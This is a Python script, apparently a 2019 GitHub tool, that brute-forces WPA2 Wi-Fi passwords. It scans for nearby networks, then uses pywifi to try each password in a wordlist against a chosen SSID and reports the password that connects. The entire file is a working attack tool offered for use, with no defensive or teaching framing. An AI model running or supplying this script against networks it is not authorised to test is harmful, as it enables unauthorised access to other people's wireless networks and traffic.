#!./venv/bin/python
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import os.path
import platform
import re
import time
try:
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
except:
    print("Installing pywifi")


RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

try:
    wlan_num = 1
    # wlan
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[wlan_num]
    print(RED, f'Interface: {ifaces.name()}')

    ifaces.scan() #check the card
    time.sleep(5)
    results = ifaces.scan_results()
    results_ssid = set(map(lambda x: x.ssid, results))
    print(CYAN, 'Networks:')
    for ssid in results_ssid:
        print(' -', ssid)
    
    wifi = PyWiFi()
    iface = wifi.interfaces()[wlan_num]
except Exception as e:
    print(f"[-] Error system: {e}")
    exit()

type = False

def main(ssid, password, number, n):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) # 1s

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, GREEN,'[*] Crack success!',RESET)
        print(BOLD, GREEN,'[*] password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}/{}] Crack Failed using {}'.format(number, n, password))

def pwd(ssid, file):
    number = 0
    n = sum(1 for i in open(file, 'r', encoding='utf8'))
    print(f'File {file} has {n} passwords')
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number, n)
                    


def menu():
    parser = argparse.ArgumentParser(description='argparse Example')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    group1 = parser.add_mutually_exclusive_group()

    group1.add_argument('-v', '--version', metavar='', help='version')
    print(" ")

    args = parser.parse_args()

    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)

    if args.wordlist or args.ssid:
        if args.wordlist:
            filee = args.wordlist
        else:
            print(BLUE)
            filee = input("[*] pwds file: : ")
        if args.ssid:
            ssid = args.ssid
        else:
            print(BLUE)
            ssid = input("[*] SSID: ")
    elif args.version:
        print("\n\n",CYAN,"by Brahim Jarrar\n")
        print(RED, " github", BLUE," : https://github.com/BrahimJarrar/\n")
        print(GREEN, " CopyRight 2019\n\n")
        exit()


    # thx
    if os.path.exists(filee):
        # if platform.system().startswith("Win" or "win"):
        #     os.system("cls")
        # else:
        #     os.system("clear")

        print(BLUE,"[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)


if __name__ == "__main__":
    menu()
